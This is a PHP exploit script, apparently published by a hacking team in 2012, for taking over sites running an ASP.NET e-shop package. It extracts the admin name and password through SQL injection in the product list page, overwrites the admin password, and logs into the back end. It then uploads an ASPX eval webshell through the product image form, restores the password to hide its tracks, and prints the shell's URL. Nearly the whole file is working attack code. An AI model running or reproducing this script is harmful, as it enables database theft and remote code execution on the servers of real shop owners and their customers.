<?php
	print_r('
	+！！！！！！！！！！！！！！！！！！！！！！！！！+
	ESHOP 利斌右斌廓 1.0 GetWebshell Exploit    By: vccjis[S.Y.C]
	Team : Www.MyClover.Org Www.InsiGht-Labs.org
	Data : 2012.4.22
	+！！！！！！！！！！！！！！！！！！！！！！！！！+
	'."\r\n");
	if ($argc < 3)
	{
	print_r('
	+++++++++++++++++++++++++++++++++++++++++++++++++++++
	
	Usage: php '.$argv[0].' Host Port Path 
	Example:
	php '.$argv[0].' localhost 80 /
	
	+++++++++++++++++++++++++++++++++++++++++++++++++++++
	');
	exit();
	}
	$host = $argv[1];
	$port = $argv[2];
	$path = $argv[3];
	
	$content = "xxoo";
	$cookie = "Cookie: ASP.NET_SessionId=ovsnh045kuxv3s45lvmbbi55";
	$type = "Content-Type: application/x-www-form-urlencoded";
	
	if ($argc == 5)
	{
		if ($argv[4] == "god")
		{
			echo "update adminname and password\n\r";
			$url = 'GET '.$path.'/p_list.aspx?keyword=%&maxPrice=0&minPrice=0;update%20admin%20set%20real_name=admin%2bpassword%20where%20Id=1; HTTP/1.1';
			$recvdata = SendData($host, $port, $url, $content, $cookie, $type);
			$url = 'GET '.$path.'/p_list.aspx?keyword=%&maxPrice=0&minPrice=0;update%20admin%20set%20admin=0x61646D696E,password=0x6531306164633339343962613539616262653536653035376632306638383365%20where%20Id=1; HTTP/1.1';
			$recvdata = SendData($host, $port, $url, $content, $cookie, $type);
			echo "!!!\r\n";
			echo "go /manager the get webshell\r\n"; 
			echo "the product content〃add a list of pictures〃to upload the aspx file\r\n";
			echo "it is necessary the original account password recovery, account password in the admin table real_name field.\r\n";
			echo "adminname:admin\r\n";
			echo "password:123456\r\n";
			exit();
		}
	}

	$url = 'GET '.$path.'/p_list.aspx?keyword=%&maxPrice=0&minPrice=0%20and%20(select%20top%201%20admin%20from%20admin)%3E0 HTTP/1.1';
	$recvdata = SendData($host, $port, $url, $content, $cookie, $type);
	$tempdata = "";

	if (preg_match("/\'.*\'/", $recvdata, $tempdata) == 0)
	{
		echo "\r\nget adminname error";
		exit();	
	}
	$adminname = str_replace('\'', '', $tempdata[0]);

	
	$url = 'GET '.$path.'/p_list.aspx?keyword=%&maxPrice=0&minPrice=0%20and%20(select%20top%201%20password%20from%20admin)%3E0 HTTP/1.1';
	$recvdata = SendData($host, $port, $url, $content, $cookie, $type);
	$tempdata = "";
	preg_match("/\'.*\'/", $recvdata, $tempdata);
	$password = str_replace('\'', '', $tempdata[0]);
	
	echo "adminname:".$adminname."\r\n";
	echo "adminpass:".$password."\r\n";

	$hexadminname = SetToHexString($adminname);
	$hexpassword = SetToHexString($password);
	
	$url = 'GET '.$path.'/p_list.aspx?keyword=%&maxPrice=0&minPrice=0;update%20admin%20set%20password=0x6531306164633339343962613539616262653536653035376632306638383365%20where%20admin=0x'.$hexadminname.'; HTTP/1.1';
	SendData($host, $port, $url, $content, $cookie, $type);

	$url = "GET ".$path."/back-login.aspx HTTP/1.1";
	$recvdata = SendData($host, $port, $url, $content, $cookie, $type);
	$tempdata = "";
	$VIEWSTATE = "";
	$EVENTVALIDATION = "";
	
	if (preg_match("/__VIEWSTATE\" va.*\" \/>/", $recvdata, $tempdata) == 0)
	{
		echo "\r\nlogin error";
		exit();
	}
	preg_match("/\/.*\"/", $tempdata[0],  $VIEWSTATE);
	$VIEWSTATE[0] = str_replace('"', '', $VIEWSTATE[0]);
 
	$tempdata = "";
	preg_match("/__EVENTVALIDATION\" va.*\" \/>/", $recvdata, $tempdata);
	preg_match("/\/.*\"/", $tempdata[0],  $EVENTVALIDATION);
	$EVENTVALIDATION[0] = str_replace('"', '', $EVENTVALIDATION[0]);

	$tempdate = "";
	preg_match("/ASP.NET_SessionId.*;/", $recvdata, $tempdata);
	$cookie = "Cookie: ASP.NET_SessionId=ovsnh045kuxv3s45lvmbbi55";
	
	$content = "__VIEWSTATE=".urlencode($VIEWSTATE[0])."&&__EVENTTARGET=&__EVENTARGUMENT=&__EVENTVALIDATION=".urlencode($EVENTVALIDATION[0])."&txtUserName=admin&txtPassword=123456&button=%C2%A0%C2%A0\r\n";
	$content = "__VIEWSTATE=".urlencode($VIEWSTATE[0])."&__EVENTTARGET=&__EVENTARGUMENT=&__EVENTVALIDATION=".urlencode($EVENTVALIDATION[0])."&txtUserName=".$adminname."&txtPassword=123456&button=%C2%A0dfg%C2%A0\r\n\r\n";
	$url = "POST ".$path."/back-login.aspx HTTP/1.1";
	$recvdata = SendData($host, $port, $url, $content, $cookie, $type);

	$tempdata = "";
	if (preg_match("/Cookie:.*;/", $recvdata, $tempdata) == 0)
	{
		echo "\r\nlogin error";
		exit();
	}
	 
	$cookie = $tempdata[0]." ASP.NET_SessionId=ovsnh045kuxv3s45lvmbbi55";
	$recvdata = SendData($host, $port, "GET ".$path."/manager/product_detail.aspx HTTP/1.1", "", $cookie, $type);
	$tempdata = "";
	$VIEWSTATE = "";
	$EVENTVALIDATION = "";
	if (preg_match("/__VIEWSTATE\" va.*\" \/>/", $recvdata, $tempdata) == 0)
	{
		echo "\r\nNo /manager";
		exit();
	}
	preg_match("/\/.*\"/", $tempdata[0],  $VIEWSTATE);
	$VIEWSTATE[0] = str_replace('"', '', $VIEWSTATE[0]);
 
	$tempdata = "";
	preg_match("/__EVENTVALIDATION\" va.*\" \/>/", $recvdata, $tempdata);
	preg_match("/\/.*\"/", $tempdata[0],  $EVENTVALIDATION);
	$EVENTVALIDATION[0] = str_replace('"', '', $EVENTVALIDATION[0]);
		
	$content = '------------EwwmsGcmNCcEdWawAUBSNx
Content-Disposition: form-data; name="__EVENTTARGET"


------------EwwmsGcmNCcEdWawAUBSNx
Content-Disposition: form-data; name="__EVENTARGUMENT"


------------EwwmsGcmNCcEdWawAUBSNx
Content-Disposition: form-data; name="__LASTFOCUS"


------------EwwmsGcmNCcEdWawAUBSNx
Content-Disposition: form-data; name="__VIEWSTATE"

';
	$content .= $VIEWSTATE[0]."\r\n";///wEPDwUJODI1MTc5NTgyD2QWAmYPZBYMAgMPFgIeBFRleHQFEDIwMTItMDQtMjIgMTE6NTFkAgUPFgIfAAUP6LaF57qn566h55CG5ZGYZAIHDxYCHwAFDuaCqOWlve+8mmFkbWluZAIJDxYCHgtfIUl0ZW1Db3VudAIFFgpmD2QWAmYPFQMHcHJvZHVjdAdwcm9kdWN0DOS6p+WTgeezu+e7n2QCAQ9kFgJmDxUDB2FydGljbGUHYXJ0aWNsZQzmlofnq6Dns7vnu59kAgIPZBYCZg8VAwVvcmRlcgVvcmRlcgzorqLljZXns7vnu59kAgMPZBYCZg8VAwZtZW1iZXIGbWVtYmVyDOS8muWRmOeuoeeQhmQCBA9kFgJmDxUDBnN5c3RlbQZzeXN0ZW0M57O757uf566h55CGZAILDxYCHwECBRYKZg9kFgRmDxUBB3Byb2R1Y3RkAgEPFgIfAQIFFgpmD2QWAmYPFQMQcHJvZHVjdF9jYXRlZ29yeRBwcm9kdWN0X2NhdGVnb3J5DOS6p+WTgeebruW9lWQCAQ9kFgJmDxUDEmNhdGVnb3J5X2F0dHJpYnV0ZRJjYXRlZ29yeV9hdHRyaWJ1dGUM55uu5b2V5bGe5oCnZAICD2QWAmYPFQMPcHJvZHVjdF9jb250ZW50D3Byb2R1Y3RfY29udGVudAzkuqflk4HlhoXlrrlkAgMPZBYCZg8VAw1wcm9kdWN0X2JyYW5kDXByb2R1Y3RfYnJhbmQM5Lqn5ZOB5ZOB54mMZAIED2QWAmYPFQMPcHJvZHVjdF9jb21tZW50D3Byb2R1Y3RfY29tbWVudAzkuqflk4Hor4TorrpkAgEPZBYEZg8VAQdhcnRpY2xlZAIBDxYCHwECCBYQZg9kFgJmDxUDBG5ld3MEbmV3cwzmlrDpl7vliqjmgIFkAgEPZBYCZg8VAwRoZWxwBGhlbHAM5Zyo57q/5biu5YqpZAICD2QWAmYPFQMQd2Vic2l0ZV9zaXRlcG9zdBB3ZWJzaXRlX3NpdGVwb3N0DOe9keermeWFrOWRimQCAw9kFgJmDxUDDnNlY3JldF9wcm90ZWN0DnNlY3JldF9wcm90ZWN0DOmakOengeS/neaKpGQCBA9kFgJmDxUDDWxhd19zdGF0ZW1lbnQNbGF3X3N0YXRlbWVudBLmlL/nrZbms5Xlvovlo7DmmI5kAgUPZBYCZg8VAwdyZWNydWl0B3JlY3J1aXQM5Zyo57q/5oub6IGYZAIGD2QWAmYPFQMSaW50ZWdyYXRlX3B1cmNoYXNlEmludGVncmF0ZV9wdXJjaGFzZQzlm6LotK3kuJPljLpkAgcPZBYCZg8VAwxuZXdzX3JlY3ljbGUMbmV3c19yZWN5Y2xlCeWbnuaUtuermWQCAg9kFgRmDxUBBW9yZGVyZAIBDxYCHwECBRYKZg9kFgJmDxUDBW9yZGVyBW9yZGVyBuiuouWNlWQCAQ9kFgJmDxUDD3Nob3BwaW5nX21ldGhvZA9zaG9wcGluZ19tZXRob2QM6YCB6LSn5pa55byPZAICD2QWAmYPFQMOcGF5bWVudF9tZXRob2QOcGF5bWVudF9tZXRob2QM5LuY5qy+5pa55byPZAIDD2QWAmYPFQMNc2hvcHBpbmdfZGF0ZQ1zaG9wcGluZ19kYXRlDOmAgei0p+aXtumXtGQCBA9kFgJmDxUDDG9yZGVyX3N0YXR1cwxvcmRlcl9zdGF0dXMM6K6i5Y2V54q25oCBZAIDD2QWBGYPFQEGbWVtYmVyZAIBDxYCHwECBBYIZg9kFgJmDxUDC21lbWJlcl9pbmZvC21lbWJlcl9pbmZvDOS8muWRmOeuoeeQhmQCAQ9kFgJmDxUDDG1lbWJlcl9sZXZlbAxtZW1iZXJfbGV2ZWwM5Lya5ZGY57qn5YirZAICD2QWAmYPFQMOb25saW5lX21lc3NhZ2UOb25saW5lX21lc3NhZ2UM5Zyo57q/5Y+N6aaIZAIDD2QWAmYPFQMIZmF2b3JpdGUIZmF2b3JpdGUJ5pS26JeP5aS5ZAIED2QWBGYPFQEGc3lzdGVtZAIBDxYCHwECAhYEZg9kFgJmDxUDCmFkbWluX2xpc3QKYWRtaW5fbGlzdAznrqHnkIbnmbvlvZVkAgEPZBYCZg8VAwRyb2xlBHJvbGUM6KeS6Imy566h55CGZAIND2QWAmYPFgIeB2VuY3R5cGUFE211bHRpcGFydC9mb3JtLWRhdGEWEGYPDxYCHgdWaXNpYmxlaGRkAgMPDxYCHwNoZGQCBA8PFgIfA2hkZAIKDxBkEBUGDS0t6K+36YCJ5oupLS0P5b+D55CG5YGl5bq357G7CeWwj+ivtOexuw/ouqvkvZPkv53lgaXnsbsP5oiQ6ZW/5Yqx5b+X57G7D+Wls+aAp+ivu+eJqeexuxUGATABMQEyATMBNAE1FCsDBmdnZ2dnZxYBZmQCCw8QZGQWAWZkAiQPDxYCHwNoZGQCJw8PFgIfA2hkZAIoDw8WAh8DaGRkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYHBSNjdGwwMCRDb250ZW50UGxhY2VIb2xkZXIxJGNoa0lzU2hvdwUoY3RsMDAkQ29udGVudFBsYWNlSG9sZGVyMSRjaGtJc1JlY29tbWVudAUmY3RsMDAkQ29udGVudFBsYWNlSG9sZGVyMSRjaGtJc0NvbW1lbnQFImN0bDAwJENvbnRlbnRQbGFjZUhvbGRlcjEkY2hrSXNIb3QFImN0bDAwJENvbnRlbnRQbGFjZUhvbGRlcjEkY2hrSXNOZXcFJ2N0bDAwJENvbnRlbnRQbGFjZUhvbGRlcjEkY2hrSXNEaXNjb3VudAUmY3RsMDAkQ29udGVudFBsYWNlSG9sZGVyMSRjaGtJc0RlZmF1bHRMDeHTq5UFawIyhVsczTwNYNAfyw==
	$content .= '------------EwwmsGcmNCcEdWawAUBSNx
Content-Disposition: form-data; name="__EVENTVALIDATION"

';
	$content .= $EVENTVALIDATION[0]."\r\n";///wEWJwKs5v06Atqk0q0LAqiR6t4KAp6y8rMBAqKKxtACAsHKosgDAruSn4INAvvs89EPAoim8JICApjJ2vwOAofJ2vwOAobJ2vwOAoXJ2vwOAoTJ2vwOAoPJ2vwOAsWeztoBAtXx5LQNAvLf/5UFAvbTvuwMAqP8+4wOArWL1rkIArOYgK0OAuT2yp4BAtr2xvsMAqjJ1JIOApmbyKgEAu27qeUIAp7KhdUMAt/A1eoLAorU36cKAqyP95gBAvPv2FMCo5i5SQKW9+GSCQLKz7OlDALtheC3DwK87PLABgKokaLfCgKesorLBNFtpcfh8T+rQvlfSsD5CYiQmB8C
	$content .= '------------EwwmsGcmNCcEdWawAUBSNx
Content-Disposition: form-data; name="ctl00$ContentPlaceHolder1$txtProductName"


------------EwwmsGcmNCcEdWawAUBSNx
Content-Disposition: form-data; name="ctl00$ContentPlaceHolder1$txtOrderBy"


------------EwwmsGcmNCcEdWawAUBSNx
Content-Disposition: form-data; name="ctl00$ContentPlaceHolder1$txtStock"


------------EwwmsGcmNCcEdWawAUBSNx
Content-Disposition: form-data; name="ctl00$ContentPlaceHolder1$txtSaleNumber"


------------EwwmsGcmNCcEdWawAUBSNx
Content-Disposition: form-data; name="ctl00$ContentPlaceHolder1$ddlCategory"

0
------------EwwmsGcmNCcEdWawAUBSNx
Content-Disposition: form-data; name="ctl00$ContentPlaceHolder1$ddlSecondCategory"

0
------------EwwmsGcmNCcEdWawAUBSNx
Content-Disposition: form-data; name="ctl00$ContentPlaceHolder1$ddlThirdCategory"

0
------------EwwmsGcmNCcEdWawAUBSNx
Content-Disposition: form-data; name="ctl00$ContentPlaceHolder1$ddlBrand"

0
------------EwwmsGcmNCcEdWawAUBSNx
Content-Disposition: form-data; name="ctl00$ContentPlaceHolder1$chkIsShow"

on
------------EwwmsGcmNCcEdWawAUBSNx
Content-Disposition: form-data; name="ctl00$ContentPlaceHolder1$chkIsComment"

on
------------EwwmsGcmNCcEdWawAUBSNx
Content-Disposition: form-data; name="ctl00$ContentPlaceHolder1$chkIsNew"

on
------------EwwmsGcmNCcEdWawAUBSNx
Content-Disposition: form-data; name="ctl00$ContentPlaceHolder1$txtPrice"


------------EwwmsGcmNCcEdWawAUBSNx
Content-Disposition: form-data; name="ctl00$ContentPlaceHolder1$txtSalePrice"


------------EwwmsGcmNCcEdWawAUBSNx
Content-Disposition: form-data; name="ctl00$ContentPlaceHolder1$txtIntegral"


------------EwwmsGcmNCcEdWawAUBSNx
Content-Disposition: form-data; name="ctl00$ContentPlaceHolder1$hiddenImage"


------------EwwmsGcmNCcEdWawAUBSNx
Content-Disposition: form-data; name="ctl00$ContentPlaceHolder1$hiddenImageId"


------------EwwmsGcmNCcEdWawAUBSNx
Content-Disposition: form-data; name="ctl00$ContentPlaceHolder1$fuUploadList"; filename="asd.aspx"
Content-Type: application/octet-stream

<%'."@".' Page Language="Jscript"%><%eval(Request.Item["fun"],"unsafe");%>
------------EwwmsGcmNCcEdWawAUBSNx
Content-Disposition: form-data; name="ctl00$ContentPlaceHolder1$btnUploadList"

......
------------EwwmsGcmNCcEdWawAUBSNx
Content-Disposition: form-data; name="ctl00$ContentPlaceHolder1$fuDetailImage"; filename=""


------------EwwmsGcmNCcEdWawAUBSNx
Content-Disposition: form-data; name="ctl00$ContentPlaceHolder1$fuDetailZoomImage"; filename=""


------------EwwmsGcmNCcEdWawAUBSNx
Content-Disposition: form-data; name="ctl00$ContentPlaceHolder1$txtKeywords"


------------EwwmsGcmNCcEdWawAUBSNx
Content-Disposition: form-data; name="ctl00$ContentPlaceHolder1$txtSummary"


------------EwwmsGcmNCcEdWawAUBSNx
Content-Disposition: form-data; name="ctl00$ContentPlaceHolder1$txtContent"


------------EwwmsGcmNCcEdWawAUBSNx--';
	
	$type = "Content-Type: multipart/form-data; boundary=----------EwwmsGcmNCcEdWawAUBSNx";//"Content-Type: multipart/form-data; boundary=----------FhmN6QFkeZCWDWoYR7K01F";
	$recvdata = SendData($host, $port, "POST ".$path."/manager/product_detail.aspx HTTP/1.1", $content, $cookie, $type);
	$tempdata = "";
	preg_match("/upload-file\/images\/product.*\.aspx/", $recvdata, $tempdata);
	$url = 'GET '.$path.'/p_list.aspx?keyword=%&maxPrice=0&minPrice=0;update%20admin%20set%20password=0x'.$hexpassword.'%20where%20admin=0x'.$hexadminname.'; HTTP/1.1';
	SendData($host, $port, $url, $content, $cookie, $type);
	
	echo "\r\nwebshell:http://$host/".$tempdata[0]."\r\n";
	
function SendData($host, $port, $url, $content, $cookie, $type)
{
	$data = $url."\r\n";
	$data .= "Referer: http://$host/\r\n";
	$data .= $type."\r\n";
	$data .= "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\n";
	$data .= "User-Agent: Opera/9.80 (Windows NT 5.2; U; zh-cn) Presto/2.10.229 Version/11.62\r\n";
	$data .= "Host: $host\r\n";
	$data .= "Content-Length: ".strlen($content)."\r\n";
	$data .= "Accept-Encoding: gzip, deflate\r\n";
	$data .= "Connection: Close\r\n";
	$data .= $cookie."\r\n\r\n";
	$data .= $content;
	$ock=fsockopen($host,$port);
	if (!$ock) 
	{
		echo "No response from host\n";
	}
	fwrite($ock,$data);
	$recvdata = "";
	while (!feof($ock)) 
	{
		$exp=fgets($ock, 1024);
		$recvdata .= $exp;
	}
	fclose($ock);
	return $recvdata;
}
function SingleDecToHex($dec)
{
    $tmp="";
    $dec=$dec%16;
    if($dec<10)
        return $tmp.$dec;
    $arr=array("a","b","c","d","e","f");
    return $tmp.$arr[$dec-10];
}

function SetToHexString($str)
{
    if(!$str)return false;
    $tmp="";
    for($i=0;$i<strlen($str);$i++)
    {
        $ord=ord($str[$i]);
        $tmp.=SingleDecToHex(($ord-$ord%16)/16);
        $tmp.=SingleDecToHex($ord%16);
    }
    return $tmp;
}
?>